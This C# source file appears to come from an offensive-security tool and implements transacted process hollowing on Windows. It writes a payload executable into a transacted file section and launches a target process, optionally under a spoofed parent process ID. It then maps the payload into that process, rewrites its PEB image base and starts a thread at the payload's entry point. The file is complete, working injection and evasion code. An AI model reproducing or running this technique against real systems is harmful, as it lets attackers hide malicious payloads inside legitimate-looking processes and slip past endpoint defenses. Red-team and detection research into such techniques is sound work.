using System;
using System.IO;
using TransactedHollowing.Interop;

namespace TransactedHollowing.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateTransactedHollowingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            bool isBlocking,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            IntPtr hTransactedSection;
            IntPtr pNewSectionBase;
            IntPtr pPeb;
            IntPtr pRemoteEntryPoint;
            uint nEntryPointOffset;
            bool is64BitImage;
            bool is64BitTarget;
            string imagePathName;
            bool status = false;
            IntPtr hHollowingProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            string tempFilePath = Path.GetTempFileName();

            if (Environment.Is64BitOperatingSystem && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, should be built as 32bit binary.");

                return false;
            }

            Console.WriteLine("[>] Loading image data.");

            try
            {
                using (var peImage = new PeFile(imageData))
                {
                    nEntryPointOffset = peImage.GetAddressOfEntryPoint();
                    is64BitImage = peImage.Is64Bit;

                    Console.WriteLine("[+] Image data is loaded successfully.");
                    Console.WriteLine("    [*] Architecture : {0}", peImage.Architecture.ToString());
                    Console.WriteLine("    [*] 64Bit Binary : {0}", is64BitImage);
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to load image data.");

                return false;
            }

            if (Environment.Is64BitOperatingSystem && !is64BitImage)
            {
                Console.WriteLine("[-] Should be x64 PE data in 64bit OS.");

                return false;
            }
            else if (!Environment.Is64BitOperatingSystem && is64BitImage)
            {
                Console.WriteLine("[-] Should be x86 PE data in 32bit OS.");

                return false;
            }

            Console.WriteLine("[>] Trying to load target image file.");

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve target image path.");

                return false;
            }
            else
            {
                try
                {
                    using (var peImage = new PeFile(imagePathName))
                    {
                        is64BitTarget = peImage.Is64Bit;

                        Console.WriteLine("[+] Taget image is loaded successfully.");
                        Console.WriteLine("    [*] Image Path Name : {0}", imagePathName);
                        Console.WriteLine("    [*] Architecture    : {0}", peImage.Architecture.ToString());
                        Console.WriteLine("    [*] 64Bit Binary    : {0}", is64BitTarget);
                    }
                }
                catch
                {
                    Console.WriteLine("[!] Failed to load target image.");

                    return false;
                }
            }

            if (is64BitImage != is64BitTarget)
            {
                Console.WriteLine("[!] Payload bitness should be matched with target image's bitness.");

                return false;
            }

            do
            {
                Console.WriteLine("[>] Trying to create transacted file.");
                Console.WriteLine("    [*] File Path : {0}", tempFilePath);

                hTransactedSection = Utilities.CreateTransactedSection(tempFilePath, imageData);

                if (hTransactedSection == Win32Consts.INVALID_HANDLE_VALUE)
                    break;

                status = Utilities.CreateInitialProcess(
                    commandLine,
                    ppid,
                    isBlocking,
                    windowTitle,
                    out hHollowingProcess,
                    out hThread);

                if (!status)
                    break;

                Console.WriteLine("[>] Trying to map transacted section to the hollowing process.");

                pNewSectionBase = Utilities.MapSectionToProcess(hHollowingProcess, hTransactedSection);

                if (pNewSectionBase == IntPtr.Zero)
                {
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Transacted section is mapped to the hollowing process successfully.");
                    Console.WriteLine("    [*] Section Base : 0x{0}", pNewSectionBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                }

                if (Environment.Is64BitProcess)
                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt64() + nEntryPointOffset);
                else
                    pRemoteEntryPoint = new IntPtr(pNewSectionBase.ToInt32() + nEntryPointOffset);

                Console.WriteLine("[>] Trying to get ntdll!_PEB address for the hollowing process.");

                if (!Helpers.GetProcessBasicInformation(
                    hHollowingProcess,
                    out PROCESS_BASIC_INFORMATION pbi))
                {
                    Console.WriteLine("[-] Failed to get ntdll!_PEB address for the hollowing process.");
                    break;
                }
                else
                {
                    pPeb = pbi.PebBaseAddress;
                    Console.WriteLine("[+] Got hollowing process basic information.");
                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
                }

                // Overwrite ntdll!_PEB for hollowing process.
                if (!Helpers.SetImageBaseAddress(hHollowingProcess, pPeb, pNewSectionBase))
                {
                    Console.WriteLine("[-] Failed to set new ntdll!_PEB.ImageBaseAddress.");
                    break;
                }

                Console.WriteLine("[>] Trying to start hollowing process thread.");

                ntstatus = NativeMethods.NtCreateThreadEx(
                    out IntPtr hNewThread,
                    ACCESS_MASK.THREAD_ALL_ACCESS,
                    IntPtr.Zero,
                    hHollowingProcess,
                    pRemoteEntryPoint,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero);
                status = (ntstatus == Win32Consts.STATUS_SUCCESS);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create thread.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
                else
                {
                    Console.WriteLine("[+] Thread is resumed successfully.");
                    NativeMethods.NtClose(hNewThread);
                }
            } while (false);

            if (hThread != IntPtr.Zero)
                NativeMethods.NtTerminateThread(hThread, Win32Consts.STATUS_SUCCESS);

            if (hHollowingProcess != IntPtr.Zero)
            {
                if (!status)
                    NativeMethods.NtTerminateProcess(hHollowingProcess, Win32Consts.STATUS_SUCCESS);

                NativeMethods.NtClose(hHollowingProcess);
            }

            if (hTransactedSection != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hTransactedSection);

            try
            {
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete \"{0}\". Delete it mannually.", tempFilePath);
            }

            Console.WriteLine("[*] Done.");

            return status;
        }
    }
}
